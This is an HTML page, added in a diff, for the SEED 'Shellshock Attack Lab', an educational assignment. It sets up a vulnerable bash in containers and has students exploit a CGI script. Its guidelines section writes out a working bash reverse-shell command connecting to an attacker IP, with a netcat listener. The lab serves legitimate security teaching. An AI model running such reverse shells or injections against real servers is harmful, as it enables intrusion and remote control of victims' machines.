@@ -1,0 +1,590 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <title>Shellshock Attack Lab &mdash; Network Security Lab  documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+
+  
+  
+
+  
+  
+
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+        <script src="../../_static/jquery.js"></script>
+        <script src="../../_static/underscore.js"></script>
+        <script src="../../_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="../../_static/js/theme.js"></script>
+
+    
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Return To Website" href="../../website_link/web_index.html" />
+    <link rel="prev" title="Format String Attack Lab" href="Format_String.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../../index.html" class="icon icon-home"> Network Security Lab
+          
+
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../hardware/hardware_index.html">Hardware Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../mobile/mobile_index.html">Mobile Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../network/network_index.html">Network Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../web/web_index.html">Web Security Labs</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="software_index.html">Software Security Labs</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="Shellcode.html">Shellcode Development Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Buffer_Overflow_Setuid.html">Buffer Overflow Attack Lab (Set-UID Version)</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Buffer_Overflow_Server.html">Buffer Overflow Attack Lab (Server Version)</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Return_to_Libc.html">Return-to-libc Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Environment_Variable_and_SetUID.html">Environment Variable and Program Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Race_Condition.html">Race Condition Vulnerability Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Dirty_COW.html">Dirty COW Attack Lab</a></li>
+<li class="toctree-l3"><a class="reference internal" href="Format_String.html">Format String Attack Lab</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Shellshock Attack Lab</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#overview">Overview</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#environment-setup">Environment Setup</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-1-experimenting-with-bash-function">Task 1: Experimenting with Bash Function</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-2-passing-data-to-bash-via-environment-variable">Task 2: Passing Data to Bash via Environment Variable</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-3-launching-the-shellshock-attack">Task 3: Launching the Shellshock Attack</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-4-getting-a-reverse-shell-via-shellshock-attack">Task 4: Getting a Reverse Shell via Shellshock Attack</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-5-using-the-patched-bash">Task 5: Using the Patched Bash</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#guidelines-creating-reverse-shell">Guidelines: Creating Reverse Shell</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#submission">Submission</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Network Security Lab</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
+        
+          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
+        
+          <li><a href="software_index.html">Software Security Labs</a> &raquo;</li>
+        
+      <li>Shellshock Attack Lab</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="shellshock-attack-lab">
+<h1>Shellshock Attack Lab<a class="headerlink" href="#shellshock-attack-lab" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="overview">
+<h2>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h2>
+<p>On September 24, 2014, a severe vulnerability in bash was identified.
+Nicknamed Shellshock, this vulnerability can exploit many systems and be
+launched either remotely or from a local machine. In this lab, students
+need to work on this attack, so they can understand the Shellshock
+vulnerability. The learning objective of this lab is for students to get
+a first-hand experience on this interesting attack, understand how it
+works, and think about the lessons that we can get out of this attack.
+The first version of this lab was developed on September 29, 2014, just
+five days after the attack was reported. It was assigned to the students
+in our Computer Security class on September 30, 2014. An important
+mission of the SEED project is to quickly turn real attacks into
+educational materials, so instructors can bring them into their
+classrooms in a timely manner and keep their students engaged with what
+happens in the real world. This lab covers the following topics:</p>
+<ul class="simple">
+<li><p>Shellshock</p></li>
+<li><p>Environment variables</p></li>
+<li><p>Function definition in bash</p></li>
+<li><p>Apache and CGI programs</p></li>
+</ul>
+<p><strong>Readings and videos.</strong> Detailed coverage of the Shellshock attack can be found in the
+following:</p>
+<ul class="simple">
+<li><p>Chapter 3 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
+Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</p></li>
+<li><p>Section 3 of the SEED Lecture at Udemy, Computer Security: A Hands-on Approach, by Wenliang
+Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</p></li>
+</ul>
+<p><strong>Lab environment.</strong> This lab has been tested on our pre-built Ubuntu 20.04 VM, which can be downloaded
+from the SEED website. Since we use containers to set up the lab environment, this lab does not depend
+much on the SEED VM. You can do this lab using other VMs, physical machines, or VMs on the cloud.</p>
+</div>
+<div class="section" id="environment-setup">
+<h2>Environment Setup<a class="headerlink" href="#environment-setup" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="dns-setting">
+<h3>DNS Setting<a class="headerlink" href="#dns-setting" title="Permalink to this headline">¶</a></h3>
+<p>In our setup, the web server container’s IP address is <code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>. The
+hostname of the server is called <code class="docutils literal notranslate"><span class="pre">www.seed-server.com</span></code>. We need to map
+this name to the IP address. Please add the following to <code class="docutils literal notranslate"><span class="pre">/etc/hosts</span></code>.
+You need to use the root privilege to modify this file:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>10.9.0.5       www.seed-server.com
+</pre></div>
+</div>
+</div>
+<div class="section" id="container-setup-and-commands">
+<h3>Container Setup and Commands<a class="headerlink" href="#container-setup-and-commands" title="Permalink to this headline">¶</a></h3>
+<p>Please download the Labsetup.zip file to your VM from the lab’s website, unzip it, enter the Labsetup
+folder, and use the docker-compose.yml file to set up the lab environment. Detailed explanation of the
+content in this file and all the involved Dockerfile can be found from the user manual, which is linked
+to the website of this lab. If this is the first time you set up a SEED lab environment using containers, it is
+very important that you read the user manual.</p>
+<p>In the following, we list some of the commonly used commands related to Docker and Compose. Since
+we are going to use these commands very frequently, we have created aliases for them in the .bashrc file
+(in our provided SEEDUbuntu 20.04 VM).</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ docker-compose build   # Build the container image
+$ docker-compose up      # Start the container
+$ docker-compose down    # Shut down the container
+
+// Aliases for the Compose commands above
+$ dcbuild               # Alias for: docker-compose build
+$ dcup                  # Alias for: docker-compose up
+$ dcdown                # Alias for: docker-compose down
+</pre></div>
+</div>
+<p>All the containers will be running in the background. To run commands on a container, we often need
+to get a shell on that container. We first need to use the “docker ps” command to find out the ID of
+the container, and then use “docker exec” to start a shell on that container. We have created aliases for
+them in the .bashrc file.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ dockps          // Alias for: docker ps --format &quot;{{.ID}} {{.Names}}&quot;
+$ docksh &lt;id&gt;     // Alias for: docker exec -it &lt;id&gt; /bin/bash
+
+// The following example shows how to get a shell inside hostC
+$ dockps
+b1004832e275 hostA-10.9.0.5
+0af4ea7a3e2e hostB-10.9.0.6
+9652715c8e0a hostC-10.9.0.7
+
+$ docksh 96
+root@9652715c8e0a:/#
+
+// Note: If a docker command requires a container ID, you do not need to
+//       type the entire ID string. Typing the first few characters will
+//       be sufficient, as long as they are unique among all the containers.
+</pre></div>
+</div>
+<p>If you encounter problems when setting up the lab environment, please read the “Common Problems”
+section of the manual for potential solutions.</p>
+</div>
+<div class="section" id="web-server-and-cgi">
+<h3>Web Server and CGI<a class="headerlink" href="#web-server-and-cgi" title="Permalink to this headline">¶</a></h3>
+<p>In this lab, we will launch a Shellshock attack on the web server
+container. Many web servers enable CGI, which is a standard method used
+to generate dynamic content on web pages and for web applications. Many
+CGI programs are shell scripts, so before the actual CGI program runs, a
+shell program will be invoked first, and such an invocation is triggered
+by users from remote computers. If the shell program is a vulnerable
+bash program, we can exploit the Shellshock vulnerable to gain
+privileges on the server.</p>
+<p>In our web server container, we have already set up a very simple CGI
+program (called <code class="docutils literal notranslate"><span class="pre">vul.cgi</span></code>). It simply prints out “Hello World” using a
+shell script. The CGI program is put inside Apache’s default CGI folder
+<code class="docutils literal notranslate"><span class="pre">/usr/lib/cgi-bin</span></code>, and it must be executable. Below is vul.cgi.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#!/bin/bash\_shellshock
+
+echo &quot;Content-type: text/plain&quot;
+echo
+echo
+echo &quot;Hello World&quot;
+</pre></div>
+</div>
+<p>The CGI program uses <code class="docutils literal notranslate"><span class="pre">/bin/bash_shellshock</span></code> (the first line), instead
+of using <code class="docutils literal notranslate"><span class="pre">/bin/bash</span></code>. This line specifies what shell program should be
+invoked to run the script. We do need to use the vulnerable bash in this
+lab.</p>
+<p>To access the CGI program from the Web, we can either use a browser by
+typing the following URL: <a class="reference external" href="http://www.seed-server.com/cgi-bin/vul.cgi">http://www.seed-server.com/cgi-bin/vul.cgi</a>, or
+use the following command line program curl to do the same thing. Please
+make sure that the web server container is running.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ curl http://www.seed-server.com/cgi-bin/vul.cgi
+</pre></div>
+</div>
+<p><strong>Lab Tasks</strong></p>
+<p>Detailed guidelines on the Shellshock attack can be found in the SEED
+book, so we will not repeat the guidelines in the lab description.</p>
+</div>
+</div>
+<div class="section" id="task-1-experimenting-with-bash-function">
+<h2>Task 1: Experimenting with Bash Function<a class="headerlink" href="#task-1-experimenting-with-bash-function" title="Permalink to this headline">¶</a></h2>
+<p>The bash program in Ubuntu 20.04 has already been patched, so it is no
+longer vulnerable to the Shellshock attack. For the purpose of this lab,
+we have installed a vulnerable version of bash inside the container
+(inside <code class="docutils literal notranslate"><span class="pre">/bin</span></code>). The program can also be found in the <code class="docutils literal notranslate"><span class="pre">Labsetup</span></code>
+folder (inside <code class="docutils literal notranslate"><span class="pre">image_www</span></code>). Its name is <code class="docutils literal notranslate"><span class="pre">bash_shellshock</span></code>. We need
+to use this bash in our task. You can run this shell program either in
+the container or directly on your computer. The container manual is
+linked to the lab’s website.</p>
+<p>Please design an experiment to verify whether this bash is vulnerable to
+the Shellshock attack or not. Conduct the same experiment on the patched
+version <code class="docutils literal notranslate"><span class="pre">/bin/bash</span></code> and report your observations.</p>
+</div>
+<div class="section" id="task-2-passing-data-to-bash-via-environment-variable">
+<h2>Task 2: Passing Data to Bash via Environment Variable<a class="headerlink" href="#task-2-passing-data-to-bash-via-environment-variable" title="Permalink to this headline">¶</a></h2>
+<p>To exploit a Shellshock vulnerability in a bash-based CGI program,
+attackers need to pass their data to the vulnerable bash program, and
+the data need to be passed via an environment variable. In this task, we
+need to see how we can achieve this goal. We have provided another CGI
+program (<code class="docutils literal notranslate"><span class="pre">getenv.cgi</span></code>) on the server to help you identify what user
+data can get into the environment variables of a CGI program. This CGI
+program prints out all its environment variables. Below is getenv.cgi.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#This is getenv.cgi
+#!/bin/bash_shellshock
+
+echo &quot;Content-type: text/plain&quot;
+echo
+echo &quot;****** Environment Variables ******&quot;
+strings /proc/$$/environ            ➀
+</pre></div>
+</div>
+<div class="section" id="task-2-a-using-brower">
+<h3>Task 2.A: Using brower<a class="headerlink" href="#task-2-a-using-brower" title="Permalink to this headline">¶</a></h3>
+<p>In the code above, Line ➀ prints out the contents of all the environment
+variables in the current process. Normally, you would see something like
+the following if you use a browser to access the CGI program. Please
+identify which environment variable(s)’ values are set by the browser.
+You can turn on the HTTP Header Live extension on your browser to
+capture the HTTP request, and compare the request with the environment
+variables printed out by the server. Please include your investigation
+results in the lab report.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>****** Environment Variables ******
+HTTP_HOST=www.seed-server.com
+HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) ...
+HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9, ...
+HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
+HTTP_ACCEPT_ENCODING=gzip, deflate
+...
+</pre></div>
+</div>
+</div>
+<div class="section" id="task-2-a-using-curl">
+<h3>Task 2.A: Using <code class="docutils literal notranslate"><span class="pre">curl</span></code><a class="headerlink" href="#task-2-a-using-curl" title="Permalink to this headline">¶</a></h3>
+<p>If we want to set the environment variable data to arbitrary values, we
+will have to modify the behavior of the browser, that will be too
+complicated. Fortunately, there is a command-line tool called <code class="docutils literal notranslate"><span class="pre">curl</span></code>,
+which allows users to to control most of fields in an HTTP request. Here
+are some of the userful options: (1) the <code class="docutils literal notranslate"><span class="pre">-v</span></code> field can print out the
+header of the HTTP request; (2) the <code class="docutils literal notranslate"><span class="pre">-A</span></code>, <code class="docutils literal notranslate"><span class="pre">-e</span></code>, and <code class="docutils literal notranslate"><span class="pre">-H</span></code> options
+can set some fields in the header request, and you need to figure out
+what fileds are set by each of them. Please include your findings in the
+lab report. Here are the examples on how to use these fields:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ curl -v www.seed-server.com/cgi-bin/getenv.cgi
+$ curl -A &quot;my data&quot; -v www.seed-server.com/cgi-bin/getenv.cgi
+$ curl -e &quot;my data&quot; -v www.seed-server.com/cgi-bin/getenv.cgi
+$ curl -H &quot;AAAAAA: BBBBBB&quot; -v www.seed-server.com/cgi-bin/getenv.cgi
+</pre></div>
+</div>
+<p>Based on this experiment, please describe what options of <code class="docutils literal notranslate"><span class="pre">curl</span></code> can
+be used to inject data into the environment variables of the target CGI
+program.</p>
+</div>
+</div>
+<div class="section" id="task-3-launching-the-shellshock-attack">
+<h2>Task 3: Launching the Shellshock Attack<a class="headerlink" href="#task-3-launching-the-shellshock-attack" title="Permalink to this headline">¶</a></h2>
+<p>We can now launch the Shellshock attack. The attack does not depend on
+what is in the CGI program, as it targets the bash program, which is
+invoked before the actual CGI script is executed. Your job is to launch
+the attack through the URL <a class="reference external" href="http://www.seed-server.com/cgi-bin/vul.cgi">http://www.seed-server.com/cgi-bin/vul.cgi</a>,
+so you can get the server to run an arbitrary command.</p>
+<p>If your command has a plain-text output, and you want the output
+returned to you, your output needs to follow a protocol: it should start
+with <code class="docutils literal notranslate"><span class="pre">Content_type:</span> <span class="pre">text/plain</span></code>, followed by an empty line, and then
+you can place your plain-text output. For example, if you want the
+server to return a list of files in its folder, your command will look
+like the following:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>echo Content_type: text/plain; echo; /bin/ls -l
+</pre></div>
+</div>
+<p>In this task, please use three different approaches (i.e., three
+different HTTP header fields) to launch the Shellshock attack against
+the target CGI program. You need to achieve the following objectives.
+For each objective, you only need to use one approach, but in total, you
+need to use three different approaches.</p>
+<ul class="simple">
+<li><p>Task 3.A: Get the server to send back the content of the
+<code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> file.</p></li>
+<li><p>Task 3.B: Get the server to tell you its process’ user ID. You can
+use the <code class="docutils literal notranslate"><span class="pre">/bin/id</span></code> command to print out the ID information.</p></li>
+<li><p>Task 3.C: Get the server to create a file inside the <code class="docutils literal notranslate"><span class="pre">/tmp</span></code> folder.
+You need to get into the container to see whether the file is created
+or not, or use another Shellshock attack to list the <code class="docutils literal notranslate"><span class="pre">/tmp</span></code> folder.</p></li>
+<li><p>Task 3.D: Get the server to delete the file that you just created
+inside the <code class="docutils literal notranslate"><span class="pre">/tmp</span></code> folder.</p></li>
+</ul>
+<p><strong>Questions.</strong> Please answer the following questions:</p>
+<ul>
+<li><p>Question 1: Will you be able to steal the content of the shadow file
+<code class="docutils literal notranslate"><span class="pre">/etc/shadow</span></code> from the server? Why or why not? The information
+obtained in Task 3.B should give you a clue.</p></li>
+<li><p>Question 2: HTTP GET requests typically attach data in the URL, after
+the <code class="docutils literal notranslate"><span class="pre">?</span></code> mark. This could be another approach that we can use to
+launch the attack. In the following example, we attach some data in
+the URL, and we found that the data are used to set the following
+environment variable:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ curl &quot;http://www.seed-server.com/cgi-bin/getenv.cgi?AAAAA&quot;
+...
+QUERY_STRING=AAAAA
+...
+</pre></div>
+</div>
+<p>Can we use this method to launch the Shellshock attack? Please
+conduct your experiment and derive your conclusions based on your
+experiment results.</p>
+</li>
+</ul>
+</div>
+<div class="section" id="task-4-getting-a-reverse-shell-via-shellshock-attack">
+<h2>Task 4: Getting a Reverse Shell via Shellshock Attack<a class="headerlink" href="#task-4-getting-a-reverse-shell-via-shellshock-attack" title="Permalink to this headline">¶</a></h2>
+<p>The Shellshock vulnerability allows attacks to run arbitrary commands on
+the target machine. In real attacks, instead of hard-coding the command
+in the attack, attackers often choose to run a shell command, so they
+can use this shell to run other commands, for as long as the shell
+program is alive. To achieve this goal, attackers need to run a reverse
+shell.</p>
+<p>Reverse shell is a shell process started on a machine, with its input
+and output being controlled by somebody from a remote computer.
+Basically, the shell runs on the victim’s machine, but it takes input
+from the attacker machine and also prints its output on the attacker’s
+machine. Reverse shell gives attackers a convenient way to run commands
+on a compromised machine. Detailed explanation of how to create a
+reverse shell can be found in the SEED book. We also summarize the
+explanation in Section <a class="reference external" href="#shellshock:sec:reverseshell">4</a>. In this
+task, you need to demonstrate how you can get a reverse shell from the
+victim using the Shellshock attack.</p>
+</div>
+<div class="section" id="task-5-using-the-patched-bash">
+<h2>Task 5: Using the Patched Bash<a class="headerlink" href="#task-5-using-the-patched-bash" title="Permalink to this headline">¶</a></h2>
+<p>Now, let us use a bash program that has already been patched. The
+program <code class="docutils literal notranslate"><span class="pre">/bin/bash</span></code> is a patched version. Please replace the first
+line of the CGI programs with this program. Redo Task 3 and describe
+your observations.</p>
+</div>
+<div class="section" id="guidelines-creating-reverse-shell">
+<h2>Guidelines: Creating Reverse Shell<a class="headerlink" href="#guidelines-creating-reverse-shell" title="Permalink to this headline">¶</a></h2>
+<p>The key idea of reverse shell is to redirect its standard input, output, and error devices to a network connection, so the shell gets its input from the connection, and prints out its output also to the connection. At the
+other end of the connection is a program run by the attacker; the program simply displays whatever comes
+from the shell at the other end, and sends whatever is typed by the attacker to the shell, over the network
+connection.</p>
+<p>A commonly used program by attackers is netcat, which, if running with the “-l” option, becomes
+a TCP server that listens for a connection on the specified port. This server program basically prints out
+whatever is sent by the client, and sends to the client whatever is typed by the user running the server. In the
+following experiment, netcat (nc for short) is used to listen for a connection on port 9090 (let us focus
+only on the first line).</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Attacker(10.0.2.6):$ nc -nv -l 9090      &lt;- Waiting for reverse shell
+Listening on 0.0.0.0 9090
+Connection received on 10.0.2.5 39452
+Server(10.0.2.5):$                      &lt;-Reverse shell from 10.0.2.5.
+Server(10.0.2.5):$ ifconfig
+ifconfig
+enp0s3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500
+        inet 10.0.2.5 netmask 255.255.255.0 broadcast 10.0.2.255
+        ...
+</pre></div>
+</div>
+<p>The above <code class="docutils literal notranslate"><span class="pre">nc</span></code> command will block, waiting for a connection. We now directly run the following bash
+program on the Server machine (<code class="docutils literal notranslate"><span class="pre">10.0.2.5</span></code>) to emulate what attackers would run after compromising the
+server via the Shellshock attack. This bash command will trigger a TCP connection to the attacker machine’s
+port 9090, and a reverse shell will be created. We can see the shell prompt from the above result, indicating
+that the shell is running on the Server machine; we can type the ifconfig command to verify that the IP
+address is indeed <code class="docutils literal notranslate"><span class="pre">10.0.2.5</span></code>, the one belonging to the Server machine. Here is the bash command:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Server(10.0.2.5):$ /bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;1
+</pre></div>
+</div>
+<p>The above command represents the one that would normally be executed on a compromised server. It is
+quite complicated, and we give a detailed explanation in the following:</p>
+<ul class="simple">
+<li><p>“/bin/bash -i”: The option i stands for interactive, meaning that the shell must be interactive
+(must provide a shell prompt).</p></li>
+<li><p>“&gt; /dev/tcp/10.0.2.6/9090”: This causes the output device (<code class="docutils literal notranslate"><span class="pre">stdout</span></code>) of the shell to be
+redirected to the TCP connection to 10.0.2.6’s port 9090. In Unix systems, stdout’s file
+descriptor is 1.</p></li>
+<li><p>“0&lt;&amp;1”: File descriptor 0 represents the standard input device (<code class="docutils literal notranslate"><span class="pre">stdin</span></code>). This option tells the system
+to use the standard output device as the stardard input device. Since stdout is already redirected to
+the TCP connection, this option basically indicates that the shell program will get its input from the
+same TCP connection.</p></li>
+<li><dl class="simple">
+<dt>“2&gt;&amp;1”: File descriptor 2 represents the standard error <code class="docutils literal notranslate"><span class="pre">stderr</span></code>. This causes the error output to be</dt><dd><p>redirected to stdout, which is the TCP connection.</p>
+</dd>
+</dl>
+</li>
+</ul>
+<p>In summary, the command “<code class="docutils literal notranslate"><span class="pre">/bin/bash</span> <span class="pre">-i</span> <span class="pre">&gt;</span> <span class="pre">/dev/tcp/10.0.2.6/9090</span> <span class="pre">0&lt;&amp;1</span> <span class="pre">2&gt;&amp;1</span></code>” starts
+a bash shell on the server machine, with its input coming from a TCP connection, and output going to the
+same TCP connection. In our experiment, when the <code class="docutils literal notranslate"><span class="pre">bash</span></code> shell command is executed on <code class="docutils literal notranslate"><span class="pre">10.0.2.5</span></code>, it
+connects back to the netcat process started on <code class="docutils literal notranslate"><span class="pre">10.0.2.6</span></code>. This is confirmed via the “Connection
+from <code class="docutils literal notranslate"><span class="pre">10.0.2.5</span></code> …” message displayed by netcat.</p>
+</div>
+<div class="section" id="submission">
+<h2>Submission<a class="headerlink" href="#submission" title="Permalink to this headline">¶</a></h2>
+<p>You need to submit a detailed lab report, with screenshots, to describe what you have done and what you
+have observed. You also need to provide explanation to the observations that are interesting or surprising.
+Please also list the important code snippets followed by explanation. Simply attaching code without any
+explanation will not receive credits.</p>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+        <a href="../../website_link/web_index.html" class="btn btn-neutral float-right" title="Return To Website" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="Format_String.html" class="btn btn-neutral float-left" title="Format String Attack Lab" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &#169; Copyright 2021, NEXUS Lab.
+
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
